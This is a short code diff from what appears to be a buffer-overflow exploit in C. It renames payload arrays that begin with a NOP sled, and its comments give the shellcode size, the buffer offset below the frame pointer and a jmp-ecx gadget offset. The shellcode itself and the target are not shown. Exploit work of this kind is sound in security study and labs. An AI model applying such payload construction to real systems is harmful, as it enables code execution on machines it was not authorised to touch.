@@ -13,7 +13,7 @@
 /* FIXME */
 // Shell code takes up 147 characters (bytes)
 // Buffer is 0x108 (264) bytes below %ebp
-unsigned char payload[] =
+unsigned char payload_two[] =
 	// How many nops can we fit? A LOT.
 	"\x90\x90\x90\x90\x90"
 	"\x90\x90\x90\x90\x90"
@@ -115,7 +115,7 @@ unsigned char payload[] =
 	// 0x14e4d is offset for "ff e1" (the jump ecx command)
 	;
 
-	payload[] =
+	unsigned char payload[] =
 	// How many nops can we fit? A LOT.
 	"\x90\x90\x90\x90\x90"
 	"\x90\x90\x90\x90\x90"
